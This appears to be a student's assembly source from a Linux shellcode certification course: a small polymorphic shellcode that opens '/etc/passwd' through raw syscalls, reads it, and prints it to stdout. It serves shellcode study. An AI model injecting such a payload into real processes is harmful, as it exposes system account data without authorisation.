; Filename:	tiny_read_poly.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #6 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555 


global _start

section .text

_start:
	xor ecx,ecx
	mul ecx
	mov al,0x5
	push ecx
	push dword 0x64777373
	push dword 0x61702f63
	push dword 0x74652f2f
	mov ebx,esp
	int 0x80
	xchg eax,ebx
	xchg eax,ecx
	mov al,0x3
	xor edx,edx
	mov dx,0xfff
	inc edx
	int 0x80
	xchg eax,edx
	xor eax,eax
	mov al,0x4
	mov bl,0x1
	int 0x80
	xchg eax,ebx
	int 0x80
